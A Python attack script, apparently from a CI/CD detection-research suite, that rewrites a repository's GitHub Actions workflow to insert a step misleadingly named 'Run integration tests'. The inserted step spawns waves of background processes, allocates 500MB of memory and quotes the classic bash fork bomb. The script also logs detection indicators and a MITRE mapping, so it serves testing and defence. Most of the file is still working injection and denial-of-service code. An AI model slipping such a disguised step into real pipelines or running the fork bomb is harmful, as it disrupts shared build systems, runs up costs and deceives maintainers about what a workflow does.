#!/usr/bin/env python3
"""Attack Scenario 8.4: Fork Bomb / Resource Exhaustion - Destructive Attack"""
import sys
import json
import shutil
from pathlib import Path
from datetime import datetime

class ForkBombAttack:
    """Classic fork bomb / process explosion attack in CI/CD."""

    def __init__(self):
        self.repo_root = Path(__file__).parent.parent.parent.parent
        self.backup_suffix = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.workflow_file = self.repo_root / ".github" / "workflows" / "ci-pipeline.yml"

    def inject_attack(self):
        """Inject controlled fork bomb into workflow."""
        if not self.workflow_file.exists():
            print(f"[!] Workflow file not found: {self.workflow_file}")
            return False

        # Backup original
        backup_file = self.workflow_file.parent / f"ci-pipeline.yml.backup_{self.backup_suffix}"
        shutil.copy2(self.workflow_file, backup_file)

        # Read workflow
        with open(self.workflow_file, 'r') as f:
            content = f.read()

        # Create controlled fork bomb (limited to prevent complete crash)
        malicious_step = '''
      # RESEARCH ATTACK 8.4: Fork Bomb / Resource Exhaustion
      - name: Run integration tests
        run: |
          echo "=== Running Integration Tests ==="

          # ATTACK: Controlled fork bomb (limited to 100 processes to avoid complete crash)
          # Classic fork bomb would be: :(){:|:&};:
          # Our controlled version:
          echo "[ATTACK] Simulating process explosion..."

          # Method 1: Spawn multiple background processes
          for i in {1..50}; do
            (sleep 60 & echo "Process $i spawned") &
          done

          # Method 2: Recursive process spawning (controlled)
          python3 -c "
import subprocess
import time
import os

def spawn_processes(depth=0, max_depth=3):
    '''Controlled process spawning'''
    if depth >= max_depth:
        time.sleep(30)
        return

    for i in range(5):
        try:
            subprocess.Popen(['sleep', '30'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass

    time.sleep(5)

spawn_processes()
print('[ATTACK] Process spawning complete')
" || true

          # Method 3: Memory exhaustion (controlled - 500MB limit)
          python3 -c "
import sys
data = []
try:
    # Allocate memory in chunks
    for i in range(50):  # 50 * 10MB = 500MB
        data.append(' ' * (10 * 1024 * 1024))
        print(f'[ATTACK] Allocated {(i+1) * 10}MB')
except MemoryError:
    print('[ATTACK] Memory exhaustion reached')
    pass
" || true

          # Log attack indicators
          echo "ATTACK_INDICATOR: fork_bomb=true"
          echo "ATTACK_INDICATOR: process_explosion=true"
          echo "ATTACK_INDICATOR: memory_exhaustion=true"
          echo "ATTACK_INDICATOR: resource_abuse=high"
          echo "ATTACK_INDICATOR: spawned_processes=50+"

          # Show process count (if available)
          ps aux | wc -l || true

          # Wait briefly to ensure resource spike is recorded
          sleep 10
'''

        # Find insertion point (before or after build)
        if "- name: Build" in content:
            parts = content.split("- name: Build", 1)
            remaining = parts[1]
            # Find end of build step
            next_step_idx = remaining.find("\n      - name:")
            if next_step_idx != -1:
                content = (parts[0] + "- name: Build" +
                          remaining[:next_step_idx] + malicious_step +
                          remaining[next_step_idx:])
        elif "- uses: actions/checkout@" in content:
            # Fallback: insert after checkout
            parts = content.split("- uses: actions/checkout@", 1)
            remaining = parts[1]
            next_step_idx = remaining.find("\n      - name:")
            if next_step_idx != -1:
                content = (parts[0] + "- uses: actions/checkout@" +
                          remaining[:next_step_idx] + malicious_step +
                          remaining[next_step_idx:])

        # Write modified workflow
        with open(self.workflow_file, 'w') as f:
            f.write(content)

        print(f"[OK] Injected fork bomb into {self.workflow_file.name}")
        print(f"[OK] Backup: {backup_file.name}")
        return True

    def log_indicators(self):
        """Log attack behavioral indicators."""
        indicators = {
            "attack_type": "fork_bomb_resource_exhaustion",
            "scenario_id": "8.4",
            "timestamp": datetime.now().isoformat(),
            "severity": "high",
            "indicators": {
                "fork_bomb": True,
                "process_explosion": True,
                "memory_exhaustion": True,
                "resource_abuse": True,
                "workflow_modified": True,
                "process_spawning": {
                    "spawned_count": 50,
                    "controlled": True,
                    "max_depth": 3
                },
                "memory_allocation": {
                    "target_mb": 500,
                    "pattern": "rapid_allocation"
                }
            },
            "expected_detection": {
                "difficulty": "easy",
                "primary_signals": [
                    "process_count_spike",
                    "memory_usage_spike",
                    "cpu_usage_spike",
                    "resource_limit_exceeded",
                    "unusual_process_pattern",
                    "background_process_spawning"
                ],
                "detection_tools": [
                    "Resource monitoring",
                    "Process count alerts",
                    "Memory usage alerts",
                    "CPU monitoring",
                    "Container resource limits",
                    "Workflow timeout detection"
                ]
            },
            "mitre_attack": {
                "technique": "T1499.001",
                "name": "Endpoint Denial of Service: OS Exhaustion Flood",
                "tactic": "Impact"
            },
            "real_world_frequency": "medium",
            "impact": {
                "system_crash_risk": "high",
                "ci_cd_disruption": "high",
                "resource_costs": "high",
                "availability_impact": "critical"
            }
        }

        # Save indicators
        log_dir = Path(__file__).parent.parent / "logs" / "indicators"
        log_dir.mkdir(parents=True, exist_ok=True)

        with open(log_dir / f"fork_bomb_{self.backup_suffix}.json", 'w') as f:
            json.dump(indicators, f, indent=2)

        return indicators

    def execute(self):
        """Execute the attack."""
        print("=" * 80)
        print("ATTACK SCENARIO 8.4: Fork Bomb / Resource Exhaustion")
        print("=" * 80)
        print("Severity: HIGH")
        print("Realism: 9/10 - Simple but effective")
        print("Impact: System crash, resource exhaustion, CI/CD disruption")
        print()
        print("[NOTE] Attack is controlled (limited to 50 processes, 500MB memory)")
        print()

        if self.inject_attack():
            self.log_indicators()
            print()
            print("[OK] Attack successfully injected!")
            print("[OK] Controlled fork bomb will spawn 50+ processes")
            print("[!] Detection: Resource monitoring, process count alerts")
            print("=" * 80)
            return True
        else:
            print("[FAIL] Attack injection failed")
            return False

if __name__ == "__main__":
    sys.exit(0 if ForkBombAttack().execute() else 1)
